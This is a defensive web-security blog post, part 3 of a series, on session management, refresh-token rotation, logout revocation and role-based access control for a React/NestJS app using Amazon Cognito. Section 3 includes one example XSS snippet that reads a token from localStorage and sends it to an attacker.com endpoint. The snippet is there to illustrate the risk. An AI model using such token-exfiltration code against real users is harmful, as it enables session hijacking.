---
title: "Secure Session Management: HttpOnly Cookies, Refresh Tokens, and RBAC – Part 3"
date: 2026-08-13
weight: 3
chapter: false
pre: " <b> 3.3. </b> "
---

## 1. Introduction

In modern web application design, successful user credential authentication is only the beginning. A robust, production-grade security architecture must resolve three core challenges:

1. **Authentication:** "Who is the user?"
2. **Session Management:** "How does the application safely maintain that identity over time?"
3. **Authorization:** "What actions is this user permitted to perform on system resources?"

In [Part 1](../3.1-blog1/), we examined why the **Startups Blogs** platform chose a Backend-Mediated Authentication model to protect the `COGNITO_CLIENT_SECRET`. In [Part 2](../3.2-blog2/), we dove into backend SecretHash computation and cryptographic RSA signature verification of JWTs using `aws-jwt-verify` and JWKS public key sets.

Building directly upon the previous articles, **Part 3** explores **Secure Session Management**, **Silent Refresh (Background Token Renewal)**, **Logout & Token Revocation**, and **Role-Based Access Control (RBAC)** spanning from the React 19 Frontend to the NestJS Backend and PostgreSQL database.

> 💡 **Implementation Notice**: The current production release of the Startups Blogs project utilizes client-side Bearer Tokens transmitted via the `Authorization: Bearer <accessToken>` HTTP header. This article presents a deep technical analysis of the existing implementation while proposing a **Hardened Session Architecture** based on HttpOnly Cookies and Refresh Token Rotation for future iterations.

---

## 2. Why Session Management Matters

A common misconception among developers is that receiving a JWT (JSON Web Token) upon login completes the security implementation. Without an explicit session management strategy, applications face severe security and usability trade-offs:

```text
Login
  ↓
Identity Verified
  ↓
Session Established
  ↓
Access Token Used for API Calls
  ↓
Access Token Expired
  ↓
Silent Refresh / Re-authentication
  ↓
Logout / Token Revocation
```

If an Access Token has an overly long lifespan (e.g., 30 days), a compromised token enables attackers to impersonate the user for an extended window without revocation capability. Conversely, if an Access Token expires quickly (e.g., 15 minutes) without an automated refresh mechanism, user experience suffers from constant session disconnections.

---

## 3. The Risk of Storing Tokens in `localStorage`

A widespread yet risky pattern in Single Page Applications (SPAs) is storing JWTs directly in browser storage:

```javascript
// Storing Access Token in localStorage
localStorage.setItem('token', accessToken);
```

### Why `localStorage` Introduces Vulnerability Exposure
`localStorage` is accessible to any JavaScript code executing within the same Origin. If an application suffers from a **Cross-Site Scripting (XSS)** vulnerability — stemming from un-sanitized user input, compromised third-party npm packages, or injected scripts — an attacker can read all stored items:

```javascript
// Malicious XSS script extracting tokens from localStorage
const stolenToken = localStorage.getItem('token');
fetch('https://attacker.com/steal', { method: 'POST', body: stolenToken });
```

> ⚠️ **Security Clarification:** Storing tokens in `localStorage` does not cause XSS vulnerabilities. XSS is caused by improper input/output handling in the user interface. However, `localStorage` significantly **increases the impact** of XSS because tokens are directly exposed in plain text to JavaScript.

If long-lived **Refresh Tokens** are also stored in `localStorage`, attackers can continuously generate new access tokens to maintain unauthorized access indefinitely.

---

## 4. HttpOnly Cookies as a Session Hardening Strategy

To mitigate token exfiltration via XSS, a hardened session architecture delegates token management to browser Cookie storage configured with strict security flags:

```typescript
// Example secure cookie configuration in NestJS Backend
response.cookie('access_token', accessToken, {
  httpOnly: true, // Prevents client-side JavaScript access via document.cookie
  secure: true,   // Transmits cookie exclusively over encrypted HTTPS
  sameSite: 'lax',// Mitigates Cross-Site Request Forgery (CSRF) risks
  path: '/',
  maxAge: 15 * 60 * 1000, // 15-minute lifespan
});
```

### Key Security Flags Explained:

1. **`HttpOnly`:** The most vital flag. The browser prevents JavaScript (including `document.cookie` or client scripts) from reading or writing the cookie. Even if an XSS vulnerability exists, attackers **cannot directly extract the token string**.
2. **`Secure`:** Ensures cookies are transmitted solely over encrypted SSL/TLS connections (HTTPS), preventing token interception on untrusted Wi-Fi networks (Man-in-the-Middle attacks).
3. **`SameSite` (Strict / Lax / None):** Controls whether the browser automatically attaches the cookie during cross-site requests. `Lax` or `Strict` mitigates most CSRF vectors.
4. **Signed Cookie:** The backend signs a cryptographic HMAC hash to the cookie value to detect and reject tampered client-side cookies.

> 🛡️ **Crucial Security Note:** HttpOnly cookies **do not eliminate XSS vulnerabilities**. If XSS exists, malicious scripts can still trigger forged HTTP requests from the victim's browser (since the browser automatically attaches cookies). However, HttpOnly cookies prevent attackers from **stealing tokens for remote use** on their own machines.

---

## 5. HttpOnly Cookies and Cross-Site Request Forgery (CSRF)

Transitioning from Bearer Tokens to Cookies shifts the application threat model. Because browsers automatically attach cookies to HTTP requests matching the target domain, applications must address **Cross-Site Request Forgery (CSRF)**.

### Comprehensive CSRF Mitigation Strategy:
- **`SameSite=Lax` or `Strict` Configuration:** Prevents cross-site cookie transmission when users click external links.
- **CSRF Anti-Forgery Tokens (Double Submit Cookie):** Uses a random non-cookie token that the Frontend must include in custom HTTP headers (e.g., `X-CSRF-Token`) for state-changing requests (`POST`, `PUT`, `DELETE`).
- **`Origin` and `Referer` Header Validation:** The NestJS Backend validates incoming request origins against an explicit domain allowlist.
- **Strict CORS Configuration:** Restricts cross-origin requests exclusively to trusted Frontend origins (`credentials: true`).

---

## 6. Access Token and Refresh Token Strategy

A secure session architecture balances **Security** with **User Experience**:

```text
Access Token
- Short-lived (15 - 60 minutes)
- Used for routine REST API authorization
- Limits the damage window if intercepted

Refresh Token
- Longer-lived (7 - 30 days)
- Used exclusively to request new Access Tokens
- Stored with maximum security isolation
```

```text
User Logs In Successfully
          ↓
Backend returns Access Token (15m) & Refresh Token (7d)
          ↓
Access Token Expires (API returns HTTP 401 Unauthorized)
          ↓
Client submits Refresh Token to /auth/refresh API
          ↓
Backend validates Refresh Token with Amazon Cognito
          ↓
Issues New Access Token -> Uninterrupted User Session
```

---

## 7. Silent Refresh / Background Token Renewal

Without background renewal, users actively filling out business profiles or funding listings would be abruptly logged out when their Access Token expires.

To resolve this, the React 19 Frontend implements a **Silent Refresh** workflow using **Axios Interceptors**:

```typescript
// Axios Response Interceptor for automated token refresh
import axios from 'axios';

const api = axios.create({ baseURL: '/api' });

let isRefreshing = false;
let failedQueue: Array<{ resolve: (token: string) => void; reject: (err: unknown) => void }> = [];

const processQueue = (error: unknown, token: string | null = null) => {
  failedQueue.forEach((prom) => {
    if (error) prom.reject(error);
    else prom.resolve(token!);
  });
  failedQueue = [];
};

api.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    // Detect 401 Unauthorized error and check if retry flag is unset
    if (error.response?.status === 401 && !originalRequest._retry) {
      if (isRefreshing) {
        // Queue concurrent requests while refresh is in progress
        return new Promise((resolve, reject) => {
          failedQueue.push({ resolve, reject });
        }).then((token) => {
          originalRequest.headers['Authorization'] = `Bearer ${token}`;
          return api(originalRequest);
        });
      }

      originalRequest._retry = true;
      isRefreshing = true;

      try {
        // Call refresh endpoint
        const { data } = await axios.post('/api/auth/refresh');
        const newAccessToken = data.accessToken;
        
        localStorage.setItem('token', newAccessToken);
        api.defaults.headers.common['Authorization'] = `Bearer ${newAccessToken}`;
        originalRequest.headers['Authorization'] = `Bearer ${newAccessToken}`;
        
        processQueue(null, newAccessToken);
        return api(originalRequest);
      } catch (refreshError) {
        processQueue(refreshError, null);
        // Refresh failed -> Redirect user to Login page
        window.location.href = '/login';
        return Promise.reject(refreshError);
      } finally {
        isRefreshing = false;
      }
    }

    return Promise.reject(error);
  }
);
```

### Key Technical Implementation Details:
1. **Request Queueing:** Prevents sending dozens of duplicate refresh requests when multiple concurrent API calls trigger 401 errors.
2. **Infinite Loop Guard (`_retry` flag):** Ensures that if the refresh endpoint itself fails, the interceptor does not trigger an infinite request loop.
3. **Graceful Redirect:** Redirects users to the login page only when the refresh token has expired or been revoked.

---

## 8. Refresh Token Rotation

For advanced security, the proposed architecture incorporates **Refresh Token Rotation**. 

Each time a Refresh Token is submitted to obtain a new Access Token, the backend invalidates the used Refresh Token and issues a new pair:

```text
Refresh Token A (Used once)
          ↓
Call /auth/refresh API
          ↓
Revoke Refresh Token A -> Issue Access Token B + Refresh Token B
          ↓
If an Attacker attempts to reuse Revoked Refresh Token A
          ↓
System detects Breach / Token Reuse
          ↓
Immediately revokes ALL active sessions for that user
```

This pattern provides immediate detection if a Refresh Token has been stolen and reused by a malicious actor.

---

## 9. Logout Is More Than Deleting Frontend State

A complete logout mechanism requires more than clearing tokens in client memory or deleting browser cookies.

If tokens are only removed on the client, active tokens remain valid on the AWS Cloud until their natural expiration.

```text
Client-Side Logout
- Clears tokens in localStorage / Browser Cookies
- Resets authentication state in Zustand Store

Server-Side / Identity Provider Logout
- Calls AWS SDK Cognito APIs: RevokeToken or GlobalSignOut
- Invalidates active Refresh Tokens on AWS Cloud
```

In NestJS, backend services integrate the `@aws-sdk/client-cognito-identity-provider` SDK:

- **`RevokeTokenCommand`:** Invalidates the specific Refresh Token associated with the current session.
- **`GlobalSignOutCommand`:** Signs out the user across **all active devices and sessions** by revoking all issued tokens for that `username`.

---

## 10. Role-Based Access Control (RBAC)

Following identity verification and session maintenance, the system enforces **Authorization**.

In **Startups Blogs**, system roles are defined in the Prisma Schema:

```prisma
// Excerpt from backend/prisma/schema.prisma
enum Role {
  USER
  ADMIN
  MODERATOR
}
```

### System Role vs. Resource Ownership:

```text
System Role (USER, ADMIN, MODERATOR)
- Grants general administrative authority (Business moderation, article publishing, locking accounts).

Resource Ownership (ownerId == user.id)
- A user with role USER owns one or more Business profiles via the ownerId field.
- USER can only modify or delete Business entities they explicitly own.
```

Combining **System Roles** and **Resource Ownership** creates a robust two-tier authorization model.

---

## 11. Frontend Protected Routes

In the React 19 Frontend, sensitive application routes are wrapped with a `ProtectedRoute` component for user experience:

```tsx
// ProtectedRoute Component in React Frontend
import { Navigate, Outlet } from 'react-router-dom';
import { useAuthStore } from '@/stores/authStore';

interface ProtectedRouteProps {
  allowedRoles?: Array<'USER' | 'ADMIN' | 'MODERATOR'>;
}

export const ProtectedRoute = ({ allowedRoles }: ProtectedRouteProps) => {
  const { user, isAuthenticated } = useAuthStore();

  if (!isAuthenticated) {
    return <Navigate to="/login" replace />;
  }

  if (allowedRoles && user && !allowedRoles.includes(user.role)) {
    return <Navigate to="/unauthorized" replace />;
  }

  return <Outlet />;
};
```

> ⚠️ **Golden Rule of Security:** Frontend route guards are strictly for **user experience and navigation control**. They are **NOT a Security Boundary**. Attackers can bypass the React UI and issue HTTP requests directly to API endpoints. Therefore, all authorization rules **must be enforced independently on the NestJS Backend**.

---

## 12. Backend Authorization Engine

On the NestJS Backend, every protected API request traverses a multi-layer verification pipeline:

```text
Client Request
      ↓
JwtAuthGuard (Verifies RSA JWT signature via aws-jwt-verify & attaches user payload)
      ↓
RolesGuard (Verifies system roles: @Roles('ADMIN', 'MODERATOR'))
      ↓
Business Service (Verifies resource ownership: business.ownerId === user.userId)
      ↓
Prisma ORM & PostgreSQL (Executes SQL transaction)
      ↓
HTTP Response
```

### NestJS RolesGuard Implementation:

```typescript
// Excerpt from backend/src/auth/guards/roles.guard.ts
@Injectable()
export class RolesGuard implements CanActivate {
  constructor(private reflector: Reflector) {}

  canActivate(context: ExecutionContext): boolean {
    const requiredRoles = this.reflector.getAllAndOverride<Role[]>(ROLES_KEY, [
      context.getHandler(),
      context.getClass(),
    ]);
    if (!requiredRoles) return true;

    const { user } = context.switchToHttp().getRequest<AuthenticatedRequest>();
    return requiredRoles.some((role) => user?.role === role);
  }
}
```

### Service-Level Resource Ownership Check:

```typescript
// Excerpt from backend/src/businesses/businesses.service.ts
async update(id: string, updateDto: UpdateBusinessDto, ownerId: string) {
  const business = await this.prisma.business.findUnique({ where: { id } });
  if (!business) throw new NotFoundException('Business not found');
  
  // Verify strict resource ownership
  if (business.ownerId !== ownerId) {
    throw new ForbiddenException('You do not have permission to update this business');
  }

  return this.prisma.business.update({ where: { id }, data: updateDto });
}
```

---

## 13. Session Architecture for Startups Blogs

The following diagram illustrates the complete session management and RBAC authorization flow combining Amazon Cognito, NestJS guards, and PostgreSQL:

![Proposed secure session management and RBAC architecture](/images/blogs/blog3-proposed-session-rbac-architecture.png)

*Figure 1. Proposed secure session management architecture using HttpOnly Cookies, Silent Refresh, Amazon Cognito, and RBAC.*

> **Note:** This diagram represents the proposed hardened session architecture for Startups Blogs. The current implementation still uses a client-side Access Token with `Authorization: Bearer <accessToken>`.

---

## 14. Security Checklist

When implementing production session management and authorization systems, review the following checklist:

- [x] **Enforce HTTPS:** Mandatory SSL/TLS encryption for all application traffic.
- [x] **No Plain Tokens in Storage:** Avoid storing long-lived Refresh Tokens in `localStorage`.
- [x] **HttpOnly & Secure Cookies:** Apply `HttpOnly`, `Secure`, and `SameSite` flags for session cookies.
- [x] **CSRF Protections:** Implement Anti-CSRF mechanisms (`SameSite`, double-submit headers, Origin checks).
- [x] **Cryptographic RSA JWT Verification:** Validate signatures against Cognito JWKS using `aws-jwt-verify`.
- [x] **Short-lived Access Tokens:** Configure short access token lifespans (15–60 minutes).
- [x] **Silent Refresh Mechanism:** Implement automated background refresh interceptors in Frontend clients.
- [x] **API Rate Limiting:** Apply `@nestjs/throttler` to protect authentication endpoints.
- [x] **Backend RBAC Enforcement:** Protect all sensitive endpoints with `JwtAuthGuard` and `RolesGuard`.
- [x] **Ownership Check:** Validate `ownerId` at the Service layer before mutating entity records.
- [x] **Server-side Session Revocation:** Invalidate refresh tokens on logout via Cognito `RevokeToken` or `GlobalSignOut`.

---

## 15. Current Architecture vs. Proposed Hardened Architecture

| Criterion | Current Implementation | Proposed Hardened Architecture |
| --- | --- | --- |
| **Token Storage** | `localStorage` + `Authorization: Bearer` header | `HttpOnly` + `Secure` + `SameSite` Cookies |
| **JWT Verification** | Backend `aws-jwt-verify` RSA signature check | Backend `aws-jwt-verify` RSA signature check |
| **XSS Exfiltration Risk** | Higher exposure if XSS occurs (Token readable) | Reduced exposure (JavaScript cannot read cookie) |
| **CSRF Risk** | Minimal traditional CSRF exposure | Managed via `SameSite` flags and Anti-CSRF headers |
| **Token Refresh** | Client-managed via Axios interceptor | Backend-managed silent refresh with HttpOnly cookie |
| **Authorization** | `JwtAuthGuard` + `RolesGuard` + Owner Check | `JwtAuthGuard` + `RolesGuard` + Owner Check |
| **Logout** | Client-side state clear | Server-side token revocation via Cognito `RevokeToken` |

---

## 16. Conclusion

Session management and role-based authorization form the final pillar of enterprise application security. A resilient security architecture depends on three unified layers:

$$\text{System Security} = \text{Authentication (Cognito)} + \text{Session Management (HttpOnly/Refresh)} + \text{Authorization (RBAC/Ownership)}$$

- **Amazon Cognito** handles cloud-native identity management and password security.
- **HttpOnly Cookies & Silent Refresh** protect tokens from exfiltration while providing a seamless user experience.
- **NestJS Guards & Ownership Validation** ensure PostgreSQL business data remains accessible strictly to authorized users based on verified roles.

Integrating these security mechanisms into **Startups Blogs** provides invaluable practical experience in distributed systems engineering, cloud security, and modern full-stack web architecture.

---

### Key Takeaways

1. **Post-Authentication Session Security:** Successful authentication is only the first step; maintaining secure sessions via Refresh Tokens and enforcing proper logout revocation is critical.
2. **`localStorage` Risks vs. HttpOnly Cookie Hardening:** Storing tokens in `localStorage` increases XSS exfiltration impact; HttpOnly cookies protect tokens from direct JavaScript extraction.
3. **Silent Refresh & Axios Interceptors:** Automated background token renewal via Axios response interceptors prevents user session disruption.
4. **RBAC & Resource Ownership Validation:** Combining `JwtAuthGuard`, `RolesGuard`, and service-level resource ownership checks (`ownerId`) ensures strong PostgreSQL data authorization.

---

### Authentication Security Series

- [Part 1: Why Should Authentication Requests Go Through the Backend? – Amazon Cognito with React and NestJS](../3.1-blog1/)
- [Part 2: Securing Amazon Cognito Authentication: SecretHash and JWT Signature Verification – Part 2](../3.2-blog2/)
- **Part 3: Secure Session Management: HttpOnly Cookies, Refresh Tokens, and RBAC – Part 3**

---

### Original Post

[View the original post on Facebook](https://www.facebook.com/photo/?fbid=1060772963325290&set=gm.2243690619729231&idorvanity=660548818043427)